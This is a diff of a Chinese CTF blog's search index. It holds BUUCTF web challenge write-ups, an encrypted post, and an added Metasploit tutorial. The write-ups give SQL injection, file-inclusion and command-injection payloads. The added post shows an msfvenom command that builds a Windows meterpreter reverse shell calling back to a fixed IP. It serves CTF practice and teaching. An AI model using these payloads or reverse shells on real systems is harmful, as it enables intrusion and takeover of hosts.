@@ -406,8 +406,8 @@
   <entry>
     <title>buuctf之web</title>
     <url>/2021/01/12/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<a id="more"></a><!-- toc -->
-<h1>[HCTF 2018]WarmUp</h1>
+    <content><![CDATA[<!-- toc -->
+<h1>HCTF 2018 WarmUp</h1>
 <p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
 <p>右键源代码得到提示</p>
 <p>访问source.php 得到源码</p>
@@ -442,7 +442,7 @@
 <p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
 <p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
 <p>参考:<a href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
-<h1>[强网杯 2019]随便注</h1>
+<h1>强网杯 2019随便注</h1>
 <p>单引号试探</p>
 <p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
 <p>然后 1’# 成功回显，发现并没有过滤注释符</p>
@@ -482,16 +482,16 @@
 <p>或者</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
 <p>参考:<a href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
-<h1>[极客大挑战 2019]EasySQL</h1>
+<h1>极客大挑战 2019 EasySQL</h1>
 <p>测试得到是单引号闭合</p>
 <p>万能密码就能爆出flag</p>
 <p><strong>payload:</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Havefun</h1>
+<h1>极客大挑战 2019 Havefun</h1>
 <p>查看源码,发现代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
-<h1>[SUCTF 2019]EasySQL</h1>
+<h1>SUCTF 2019 EasySQL</h1>
 <p>尝试看看 查询当前数据库名</p>
 <p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
 <p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
@@ -506,13 +506,13 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
 <p>本地测试一下:</p>
 <p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
-<h1>[ACTF2020 新生赛]Include</h1>
+<h1>ACTF2020 新生赛 Include</h1>
 <p>打开题目 tips</p>
 <p>发现地址栏有个file参数 明显的文件包含</p>
 <p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Secret File</h1>
+<h1>极客大挑战 2019 Secret File</h1>
 <p>打开题目右键查看源码</p>
 <p>发现 Archi ve_room.php</p>
 <p>然后 点进去源码又发现action.php</p>
@@ -522,7 +522,7 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 <p>伪协议读取得到flag</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]LoveSQL</h1>
+<h1>极客大挑战 2019 LoveSQL</h1>
 <p>打开题目 order by发现字段为3</p>
 <p>查表: 有两个</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
@@ -535,7 +535,7 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 <p>可以用 group_concat</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
-<h1>[GXYCTF2019]Ping Ping Ping</h1>
+<h1>GXYCTF2019 Ping Ping Ping</h1>
 <p>打开题目发现是rce</p>
 <p>尝试读取:  没有过滤分号</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
@@ -547,6 +547,26 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
       <categories>
         <category>刷题站</category>
         <category>buuctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ctfshow入门之文件上传</title>
+    <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="fce44747cc765e8336660ca105f0142f7fb373de40d9f8e3e582e5e607f69f23">6031008eaf30dfa9f6cee48a6a69006e896f594f81183912ac164ca838c072b8bc7394e215a2a889511d19c32897ae9d21b2ba4e1d444c2c02094ad71a6b39d17257f2d8f718245e1d7e8b6b6cfc0ea9d1b314fd2372d9c7714403d43f84210da43bd3331f26887913c016fca8a848cc0928915412a7e75452bfffa0a393d778e924068aae21cd85167abeaa1e66a1009ffcbe718f406eb34a0374ab8be6193f47401d3d092a9759b03040ed8adcfbeb3346841c8f68db19ec254b99a051c781fd17bf15aa7cb55c3baf3f98fa8e9640123827b9b6f53262fe139b49bc8aca3e637aba81e6f854798fbb1fd18aaa9f0a51959ba14b07748514cb9b9be559484708ba932c6d80efc8034c7ca056a0b4cd9dfd14f8b053d14b343564db16f3a42da581090909dc8fc0cf6f898de89d0dbc5dc5fef54b5a13c539481338dca559c3bd761f97e11c52a77de76ae1b208161dd30c70eb1ea769f0f2fe590934869f16394bfd5315fbcbf343a7c2a5b68f30f5aa018b95cc0eabdf8fe4efb085ef979727690dfcf95fc1fc76bf84fff3d04ceb7352633f466ddfc4ef5492dfac058258b9cf95e86488ed376673bc731fc2d3c656128fd8160083e850b37934afd9b894004c118f63e64a3c4856c0590f5203fb4219237bb824d9f427d6a255f05c207a046af6a75c8b709025c697dbf977517e10f2225893f4858f84903c2408048fd9dfe2234279863e444af225c92fc76f9b1acf020f164f58b15876de5d9d7de074b43deaffb265cff309db9ad2b045065c6a9f4387d1d345a18f241fa201097189ca4d5bd2ba26077e51c3a3377375f0442b5a40ac691761db2c90db4119bfa490ff49c1ec6e793271bb04856fbf78b984a9bd44931e39625e9b816c51d8528dc7d7ce6f762f54240a795e756adfc1caca746b46eda0377d8026823790c36d49d169ea4bfac438567665081114a2ee7153e58d582d25212a2b8e6030ac04a8745e1a63b27af1222dab02fcdea37e9a632b06dd0e6171df8c5bc01d3b21719972b588420d90da5d676a681cd5f762d9bfe31a9fd70b7ad50e848bdc4737345fdfff49d37af72a0dc04acf8f2e0c1db41e152475f756a4c40db6936aed61d4666f5154da9bfd7c3710fe84bdbd808b9fdf3b743acebc57389d54c91a03b946f1780022314b48f3ededf06728f3d8fb956d90687a1ff270a033fa377a2eee80f1d09a6afc46ff4afc6aee9e5f0b56ac2d12ded905a8d353d8e64f1d18955764a07485a91b053a8661785474789e04491dab8f928fbdf5535df6bc99c5ad3b862fcaa35e614a5eff599ceef4de0001cae653396680d1697260e179fa347dcab05034f9d6ea2f7061659fe2e16e40069b5d21ed11833c4b3e3765b49d8b5e374f759707fff4e843f11f93e8a07d0e38781081aed3d6425980e6033cdd058902f1aed763c631df68a2dfc202528d7e720087dbbd574b66e7c9aea8ea876c24131d04b986e2db4c7e511d6b1a4952e3e59c7f9a9e6c9f0c801e5fc8021599c1b3d1bc22f2575df2eb30e78ab553fc90e30927a8a70ac87ac26dd096d7923e2f9f39e5c222fa4b78ad6f34065dab16f0cb5d7dcb3d754e227856a9968bd641dc5e574d4514bb42cbad6cfde9d98207c2191d4aef39b7b247cd271f366478845fa6dbd14e61824f6ccda0f96db2a28eb54c08d91c3da3602eb628fdfe1a74ccf33c640205fdfb659d8a39c50070ffce8b72770a0a6f9f08627a5a6a5116e9b3e05e6196ff7b59d22487233c529ab55c772981fc9e007b545531f8e6dacd5d0236858986e93fad8d5bc1e727b359041cb7615f145fee3b33540af775985aead965cced1d0de6d6931b0e6d2dd14198d3c4cc9e39d3a75e745d283934abe2f9f1e03fcc28d536d4da3249c7f7f7dfee76d0117f48ca8fe2002c01ffef7b992f046ff42a2423d4eaddfb2778d41101ed4c61a5b36a0841fe495d055c491d935f09e4ab7353634a99a55f09125c939c8acdc2f190dfd1fb0ceb1fde68ad8bda5ecb9e0e8fbcc9fd06cd679c5a83661380db8e659151b31fa7021b872bf25080dd15ea07d5d969661479a839400816a5246fd6eb474bb01a0126566047884e6eee0ecad1709082e044c4fd9e0c0c7ab3a64a3fcced8ad6103538aaab41ab5011268f50cc46977bee77e876ff12295beba1c4027ff0f41c9cc3bc19c576ffc22a7676c079bb071a86a5f6d4bd709070e4e31751e6ba6c6e7c66cd602cf75b03c3951bd70be343faa4cf248d1a0bb4e2ae08d5e2abceb7e05a3c00b4463eb6c1bef263773cbcd9f1fa3fa74951f254096f28390ba2738e6bada35c9f1b17166e7f42854d442da10a3ccaeb93f1280478d5befc73fe40f12750f43460eee9fcf01437fd50f234d8867bde0d9bdd4ec1b764b4eee88f2d70516fe079cd3e801e5380f1f2565a465f9a960a343d7cd165d278eca9ad454dc54a2d880c61c739740949d84d9b4c69b78071361bce43bf83ee5c31d5db3c5ba9ba6ecf3c9b3c10386e5ba6e98c7805a4ed9e4552900445ffc267e515619ff38166bd41afa4952c8bee68dedf3a7e4b269b4c3ff565efe83e9a3eac64c82f6add32c1b64f5fbab493ac286e7e40d128cc14f4644490d2bf41f0584cba32b2c529a69ad0ea5d8676026fe25d135d2cb92a6bc1e19c496f2a41a514d6226407b24c46adedc9f751ee17ffd1af846bdf94fb384d7456757ba12c28d6dd1156c8e5d79b057486f4bab0861a86693da14ec2635d18fc291adbf1f245c301fe74148848eaee898faaa89d25aab351cecc93de398a7fdfc17f4eec07467f6dead8195484043654dd7915f6ff7f380a91fcb6f4f6c81aec3321493c7972faf0c9a3348f7e145d3b7e0d1dca974367f9f46379e0cb33d0fddc54f3e02286b48b968bef97a4cd723ebfd82278cdaea4c0828f88a550008f6d5e697246b7de7f4a443ef6a2347b11b2e507c968b679292da20f77b04a6fb6c4e5e4eaaa492a952bc28dcbe163bab6791a5f58a8a2b17c8807a606366a422327d090b73df8e34077de97e443750fd90f09d3b188e8cc37e990a17df0d7a3f2fa3e5c8af654063cc928f76d8260038f867253ffbc5280c6d51f0627257b471853360f485ad46e489cef77d299f60ab6ae944050ed5303040f2150b450f0774c0dc1dc3887c5d66440dc29b31c6be8301b99906f1965ae651e6d4067c9bbae670340b12952d5dbc4aba3a09948015e313b853707abb065de5947c48ba5aaef322aa78ed409ff0087875c1b78d7cd174db8939d98c88a9dc2070f879d49fde1c528e3489268dde781c3ccae5b9c8e1c74d718578b69effaa5d11542c7e2711d8a0a3fde56b07562a4d0d4318d532fe168695e45dfff58cd23f0676c5f2cefeb29bef3d501f69bc9872494773dc339b73d999f2c3e164222d6ae0b8fa3cc0f28b6615c5233fac8eefa11a21a375b1a8a0ff4c86010f4c69e85ed482ecc33469d0b74f9af2e8fe5342a6e3b53a15358c9d549310300fd29a7dc7e63e4b18d2bc5b8f6bb8b7a654d718bfc8e9240377fe317877a3560b9f12d9a8385ee88b07b639157b38edb1ef021d27ec14d5a1dae02a1c281cba7e0e47bfd89b194989b4fd8347f4f9398a457b7c699b1b4c3484a402db7bb9653161766cc65853532f6256904afb0bfb0b3b084257878f0f735425d719765ebf3a0392c89ddca911feb685f65e669324daea917646ae1126da7c361aa683b44513dda3320b9436c831d7164aba9a04a94ffaab7998175bb4ca4bb760d4f44dbbcb262a1d76ced76ae73babe67ab27e913b975f3267cd4d9dbec5275b2dbe023c87f96a72889737042ce7f1d59c670efc9a3be92fb8737e14c7080256a922c7e3067d504269767fd8280f8ac1c0a923d92acaafa48c4545f8e09e8ed6e45f4dcb69002ac7d16832424275bb30e04819dca201308596ac1c42c138920a1ddde4fc83294553c2ca85d6e04ad31cdeb08511e3da0ef0ca702ea39abb555f3e238d84f8ef5904a161c945021a20f634c93874379744300870fd7decc96f22f3baa537bb28ed837bc51e04d61569417165f92de9ee214708c1133988d6d3b0a38ca75524f22aeecd81fae413a309d018684a9846e522224aadc1517102a13fecd36c58e6e341f6e06d82339e5bf2be9b78bddf68acb70de1fbfa6cef57a1397114467be81661856c32623c3c3fd32d2eca57c0a64bdf36888cd27cd3f60f55aade212599d858c4e28a721d2d55f5c914838bb341aa1871afc8fa7d010e5b8c0eccccc527a36cffea6490f7d6a69576ccd39c2b5b4e40bbb1f7af010aad1db461df2398a537c2ec3ad39644ff4cfad0c77c275f06120c206a8f24a7f9fb4e0ce1ba159796a71b22bd4ad4b2e5432da652ecc354243848c804cd96e09d9ca5842cc20b75875648d9dff00fe3fc57aad14f71c4cca681c2e2348b38b444c973df5de044f64eb859881be47c864f49865e2eb660433701e7faa849af954a389cf02bcc8eafd43a5cb811167c789a97917875a5ab699fab69d91da359139e7f2f620dbecd122bb020c8f6522d2850c493b16a055814455321b4b9b8ecc32d97c0c7563c84afc2c5722ce9c9dc63fe436031082387b3be8f31dd5852e026b2e43d63f3d511318885ec73c6ab3aecd6e5739030121cf944f0d42ef1ed2a48ec30cf180b2b6a5339b548adc53214df6f5045dffbeef3d4cfedf6046a7b0f71100d8ff23f84d929763229132c7be972cc6514ad7dcab8e7ea0d911e7ad54b5aeab3eee7e6ba1668c35c1b60adda4669bf05070de93817fb58269c5d37776e1ea73d24d1d450001809fa73600d49cb7168dfc21782c179d7d3d81f006490f1e49892efe992dd2e3199cb87604b7f4239971f225c116e8ec39d69c901c6a0fd30f3a8c02f4f015682f112af0a0bc07c876e9aa277bbabbe4e4affa8381089aa070b2d62b35e084f10ddecdcceeb01b08685e3dc7542f6091cdd6e3d490791c00d78d92d5917573654e574130ce6549a5bc06f06cca18912224a9fd3f071df7e3c19d1dcd804088768a56d3135175961788f4d27c5543c4741edfea92596283f6f5f31596b2f24960fe3c139be4b84497b0035de3292cd7ddcd9a286e0b19a0346aa885225e74978cc7c6e46841827a9bd17b11d1f41e7adee935b63fea8175d68ca98fb27e838fcb549659d2f903c1b64d692a424a89ba3ce295ccd499ace3ba41e821846b0f35a11eb0da56b4071ac67f2a40f1ed7baa601579041ce302703b3f4678116dafbb6b2c596a52a6bbf69bcc1e03156d88b7929e2f971b46989d722642d7a02063d18b7d394366d38b64b2485aca64f2395597c10dca8bf547e189057e69dd9e43f15d5333a80beb7e2138f376e12fc166a74fa92271311a75d490fb61cf85b2ccdd3986508cb245a356b2368e237e897e07ba034244b082b6d338838294d22d99c8ffee27a0f3b29b5464204a44a14f</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>ctfshow</category>
       </categories>
   </entry>
   <entry>
@@ -717,23 +737,20 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>ctfshow入门之文件上传</title>
-    <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="fce44747cc765e8336660ca105f0142f7fb373de40d9f8e3e582e5e607f69f23">6031008eaf30dfa9f6cee48a6a69006e896f594f81183912ac164ca838c072b8bc7394e215a2a889511d19c32897ae9d21b2ba4e1d444c2c02094ad71a6b39d17257f2d8f718245e1d7e8b6b6cfc0ea9d1b314fd2372d9c7714403d43f84210da43bd3331f26887913c016fca8a848cc0928915412a7e75452bfffa0a393d778e924068aae21cd85167abeaa1e66a1009ffcbe718f406eb34a0374ab8be6193f47401d3d092a9759b03040ed8adcfbeb3346841c8f68db19ec254b99a051c781fd17bf15aa7cb55c3baf3f98fa8e9640123827b9b6f53262fe139b49bc8aca3e637aba81e6f854798fbb1fd18aaa9f0a51959ba14b07748514cb9b9be559484708ba932c6d80efc8034c7ca056a0b4cd9dfd14f8b053d14b343564db16f3a42da581090909dc8fc0cf6f898de89d0dbc5dc5fef54b5a13c539481338dca559c3bd761f97e11c52a77de76ae1b208161dd30c70eb1ea769f0f2fe590934869f16394bfd5315fbcbf343a7c2a5b68f30f5aa018b95cc0eabdf8fe4efb085ef979727690dfcf95fc1fc76bf84fff3d04ceb7352633f466ddfc4ef5492dfac058258b9cf95e86488ed376673bc731fc2d3c656128fd8160083e850b37934afd9b894004c118f63e64a3c4856c0590f5203fb4219237bb824d9f427d6a255f05c207a046af6a75c8b709025c697dbf977517e10f2225893f4858f84903c2408048fd9dfe2234279863e444af225c92fc76f9b1acf020f164f58b15876de5d9d7de074b43deaffb265cff309db9ad2b045065c6a9f4387d1d345a18f241fa201097189ca4d5bd2ba26077e51c3a3377375f0442b5a40ac691761db2c90db4119bfa490ff49c1ec6e793271bb04856fbf78b984a9bd44931e39625e9b816c51d8528dc7d7ce6f762f54240a795e756adfc1caca746b46eda0377d8026823790c36d49d169ea4bfac438567665081114a2ee7153e58d582d25212a2b8e6030ac04a8745e1a63b27af1222dab02fcdea37e9a632b06dd0e6171df8c5bc01d3b21719972b588420d90da5d676a681cd5f762d9bfe31a9fd70b7ad50e848bdc4737345fdfff49d37af72a0dc04acf8f2e0c1db41e152475f756a4c40db6936aed61d4666f5154da9bfd7c3710fe84bdbd808b9fdf3b743acebc57389d54c91a03b946f1780022314b48f3ededf06728f3d8fb956d90687a1ff270a033fa377a2eee80f1d09a6afc46ff4afc6aee9e5f0b56ac2d12ded905a8d353d8e64f1d18955764a07485a91b053a8661785474789e04491dab8f928fbdf5535df6bc99c5ad3b862fcaa35e614a5eff599ceef4de0001cae653396680d1697260e179fa347dcab05034f9d6ea2f7061659fe2e16e40069b5d21ed11833c4b3e3765b49d8b5e374f759707fff4e843f11f93e8a07d0e38781081aed3d6425980e6033cdd058902f1aed763c631df68a2dfc202528d7e720087dbbd574b66e7c9aea8ea876c24131d04b986e2db4c7e511d6b1a4952e3e59c7f9a9e6c9f0c801e5fc8021599c1b3d1bc22f2575df2eb30e78ab553fc90e30927a8a70ac87ac26dd096d7923e2f9f39e5c222fa4b78ad6f34065dab16f0cb5d7dcb3d754e227856a9968bd641dc5e574d4514bb42cbad6cfde9d98207c2191d4aef39b7b247cd271f366478845fa6dbd14e61824f6ccda0f96db2a28eb54c08d91c3da3602eb628fdfe1a74ccf33c640205fdfb659d8a39c50070ffce8b72770a0a6f9f08627a5a6a5116e9b3e05e6196ff7b59d22487233c529ab55c772981fc9e007b545531f8e6dacd5d0236858986e93fad8d5bc1e727b359041cb7615f145fee3b33540af775985aead965cced1d0de6d6931b0e6d2dd14198d3c4cc9e39d3a75e745d283934abe2f9f1e03fcc28d536d4da3249c7f7f7dfee76d0117f48ca8fe2002c01ffef7b992f046ff42a2423d4eaddfb2778d41101ed4c61a5b36a0841fe495d055c491d935f09e4ab7353634a99a55f09125c939c8acdc2f190dfd1fb0ceb1fde68ad8bda5ecb9e0e8fbcc9fd06cd679c5a83661380db8e659151b31fa7021b872bf25080dd15ea07d5d969661479a839400816a5246fd6eb474bb01a0126566047884e6eee0ecad1709082e044c4fd9e0c0c7ab3a64a3fcced8ad6103538aaab41ab5011268f50cc46977bee77e876ff12295beba1c4027ff0f41c9cc3bc19c576ffc22a7676c079bb071a86a5f6d4bd709070e4e31751e6ba6c6e7c66cd602cf75b03c3951bd70be343faa4cf248d1a0bb4e2ae08d5e2abceb7e05a3c00b4463eb6c1bef263773cbcd9f1fa3fa74951f254096f28390ba2738e6bada35c9f1b17166e7f42854d442da10a3ccaeb93f1280478d5befc73fe40f12750f43460eee9fcf01437fd50f234d8867bde0d9bdd4ec1b764b4eee88f2d70516fe079cd3e801e5380f1f2565a465f9a960a343d7cd165d278eca9ad454dc54a2d880c61c739740949d84d9b4c69b78071361bce43bf83ee5c31d5db3c5ba9ba6ecf3c9b3c10386e5ba6e98c7805a4ed9e4552900445ffc267e515619ff38166bd41afa4952c8bee68dedf3a7e4b269b4c3ff565efe83e9a3eac64c82f6add32c1b64f5fbab493ac286e7e40d128cc14f4644490d2bf41f0584cba32b2c529a69ad0ea5d8676026fe25d135d2cb92a6bc1e19c496f2a41a514d6226407b24c46adedc9f751ee17ffd1af846bdf94fb384d7456757ba12c28d6dd1156c8e5d79b057486f4bab0861a86693da14ec2635d18fc291adbf1f245c301fe74148848eaee898faaa89d25aab351cecc93de398a7fdfc17f4eec07467f6dead8195484043654dd7915f6ff7f380a91fcb6f4f6c81aec3321493c7972faf0c9a3348f7e145d3b7e0d1dca974367f9f46379e0cb33d0fddc54f3e02286b48b968bef97a4cd723ebfd82278cdaea4c0828f88a550008f6d5e697246b7de7f4a443ef6a2347b11b2e507c968b679292da20f77b04a6fb6c4e5e4eaaa492a952bc28dcbe163bab6791a5f58a8a2b17c8807a606366a422327d090b73df8e34077de97e443750fd90f09d3b188e8cc37e990a17df0d7a3f2fa3e5c8af654063cc928f76d8260038f867253ffbc5280c6d51f0627257b471853360f485ad46e489cef77d299f60ab6ae944050ed5303040f2150b450f0774c0dc1dc3887c5d66440dc29b31c6be8301b99906f1965ae651e6d4067c9bbae670340b12952d5dbc4aba3a09948015e313b853707abb065de5947c48ba5aaef322aa78ed409ff0087875c1b78d7cd174db8939d98c88a9dc2070f879d49fde1c528e3489268dde781c3ccae5b9c8e1c74d718578b69effaa5d11542c7e2711d8a0a3fde56b07562a4d0d4318d532fe168695e45dfff58cd23f0676c5f2cefeb29bef3d501f69bc9872494773dc339b73d999f2c3e164222d6ae0b8fa3cc0f28b6615c5233fac8eefa11a21a375b1a8a0ff4c86010f4c69e85ed482ecc33469d0b74f9af2e8fe5342a6e3b53a15358c9d549310300fd29a7dc7e63e4b18d2bc5b8f6bb8b7a654d718bfc8e9240377fe317877a3560b9f12d9a8385ee88b07b639157b38edb1ef021d27ec14d5a1dae02a1c281cba7e0e47bfd89b194989b4fd8347f4f9398a457b7c699b1b4c3484a402db7bb9653161766cc65853532f6256904afb0bfb0b3b084257878f0f735425d719765ebf3a0392c89ddca911feb685f65e669324daea917646ae1126da7c361aa683b44513dda3320b9436c831d7164aba9a04a94ffaab7998175bb4ca4bb760d4f44dbbcb262a1d76ced76ae73babe67ab27e913b975f3267cd4d9dbec5275b2dbe023c87f96a72889737042ce7f1d59c670efc9a3be92fb8737e14c7080256a922c7e3067d504269767fd8280f8ac1c0a923d92acaafa48c4545f8e09e8ed6e45f4dcb69002ac7d16832424275bb30e04819dca201308596ac1c42c138920a1ddde4fc83294553c2ca85d6e04ad31cdeb08511e3da0ef0ca702ea39abb555f3e238d84f8ef5904a161c945021a20f634c93874379744300870fd7decc96f22f3baa537bb28ed837bc51e04d61569417165f92de9ee214708c1133988d6d3b0a38ca75524f22aeecd81fae413a309d018684a9846e522224aadc1517102a13fecd36c58e6e341f6e06d82339e5bf2be9b78bddf68acb70de1fbfa6cef57a1397114467be81661856c32623c3c3fd32d2eca57c0a64bdf36888cd27cd3f60f55aade212599d858c4e28a721d2d55f5c914838bb341aa1871afc8fa7d010e5b8c0eccccc527a36cffea6490f7d6a69576ccd39c2b5b4e40bbb1f7af010aad1db461df2398a537c2ec3ad39644ff4cfad0c77c275f06120c206a8f24a7f9fb4e0ce1ba159796a71b22bd4ad4b2e5432da652ecc354243848c804cd96e09d9ca5842cc20b75875648d9dff00fe3fc57aad14f71c4cca681c2e2348b38b444c973df5de044f64eb859881be47c864f49865e2eb660433701e7faa849af954a389cf02bcc8eafd43a5cb811167c789a97917875a5ab699fab69d91da359139e7f2f620dbecd122bb020c8f6522d2850c493b16a055814455321b4b9b8ecc32d97c0c7563c84afc2c5722ce9c9dc63fe436031082387b3be8f31dd5852e026b2e43d63f3d511318885ec73c6ab3aecd6e5739030121cf944f0d42ef1ed2a48ec30cf180b2b6a5339b548adc53214df6f5045dffbeef3d4cfedf6046a7b0f71100d8ff23f84d929763229132c7be972cc6514ad7dcab8e7ea0d911e7ad54b5aeab3eee7e6ba1668c35c1b60adda4669bf05070de93817fb58269c5d37776e1ea73d24d1d450001809fa73600d49cb7168dfc21782c179d7d3d81f006490f1e49892efe992dd2e3199cb87604b7f4239971f225c116e8ec39d69c901c6a0fd30f3a8c02f4f015682f112af0a0bc07c876e9aa277bbabbe4e4affa8381089aa070b2d62b35e084f10ddecdcceeb01b08685e3dc7542f6091cdd6e3d490791c00d78d92d5917573654e574130ce6549a5bc06f06cca18912224a9fd3f071df7e3c19d1dcd804088768a56d3135175961788f4d27c5543c4741edfea92596283f6f5f31596b2f24960fe3c139be4b84497b0035de3292cd7ddcd9a286e0b19a0346aa885225e74978cc7c6e46841827a9bd17b11d1f41e7adee935b63fea8175d68ca98fb27e838fcb549659d2f903c1b64d692a424a89ba3ce295ccd499ace3ba41e821846b0f35a11eb0da56b4071ac67f2a40f1ed7baa601579041ce302703b3f4678116dafbb6b2c596a52a6bbf69bcc1e03156d88b7929e2f971b46989d722642d7a02063d18b7d394366d38b64b2485aca64f2395597c10dca8bf547e189057e69dd9e43f15d5333a80beb7e2138f376e12fc166a74fa92271311a75d490fb61cf85b2ccdd3986508cb245a356b2368e237e897e07ba034244b082b6d338838294d22d99c8ffee27a0f3b29b5464204a44a14f</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
+<a id="more"></a>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
